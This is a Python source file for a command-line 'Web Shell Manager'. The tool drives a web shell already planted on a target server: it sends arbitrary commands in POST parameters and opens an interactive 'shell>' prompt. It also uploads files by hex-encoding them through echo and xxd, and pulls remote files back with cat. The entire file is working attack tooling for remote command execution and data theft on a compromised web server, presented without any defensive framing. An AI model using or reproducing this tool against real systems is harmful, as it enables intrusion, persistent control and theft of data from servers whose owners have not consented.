import argparse
import requests

class WebShellManager:
    def __init__(self, url, param="cmd", marker=None, password=None, verify_ssl=True):
        self.url = url
        self.param = param
        self.marker = marker
        self.password = password
        self.verify_ssl = verify_ssl

    def send_command(self, cmd):
        data = {self.param: cmd}
        if self.password:
            data['pass'] = self.password
        resp = requests.post(self.url, data=data, verify=self.verify_ssl)
        output = resp.text
        if self.marker:
            parts = output.split(self.marker)
            output = parts[1] if len(parts) > 1 else output
        return output.strip()

    def upload_file(self, local_path, remote_name):
        with open(local_path, "rb") as f:
            data = f.read()
        upload_script = f"echo \"{data.hex()}\" | xxd -r -p > {remote_name}"
        print("|*| Uploading file, may take some time...")
        self.send_command(upload_script)
        print(f"|+| Uploaded {local_path} as {remote_name}")

    def download_file(self, remote_name, local_path):
        cmd = f"cat {remote_name}"
        data = self.send_command(cmd)
        with open(local_path, "w") as f:
            f.write(data)
        print(f"|+| Downloaded {remote_name} to {local_path}")

    def interactive(self):
        print(f"|*| Interactive shell started at {self.url}")
        while True:
            try:
                cmd = input("shell> ")
                if cmd.strip().lower() in ('exit', 'quit'):
                    break
                result = self.send_command(cmd)
                print(result)
            except KeyboardInterrupt:
                break

def cli():
    parser = argparse.ArgumentParser(description="Python Web Shell Manager")
    parser.add_argument("url", help="Webshell URL (e.g. http://target.com/shell.php)")
    parser.add_argument("--param", default="cmd", help="Shell command variable name (default: cmd)")
    parser.add_argument("--marker", help="Unique marker to split shell output (optional)")
    parser.add_argument("--pass", dest="password", help="Password parameter for the web shell if required")
    parser.add_argument("--upload", nargs=2, metavar=('LOCALFILE','REMOTENAME'), help="Upload file to server")
    parser.add_argument("--download", nargs=2, metavar=('REMOTENAME','LOCALFILE'), help="Download file from server")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL verification")
    parser.add_argument("--cmd", help="Run single command and exit")
    args = parser.parse_args()

    mgr = WebShellManager(
        args.url, param=args.param,
        marker=args.marker,
        password=args.password,
        verify_ssl=not args.no_verify
    )

    if args.upload:
        mgr.upload_file(args.upload[0], args.upload[1])
    elif args.download:
        mgr.download_file(args.download[0], args.download[1])
    elif args.cmd:
        out = mgr.send_command(args.cmd)
        print(out)
    else:
        mgr.interactive()

if __name__ == "__main__":
    cli()
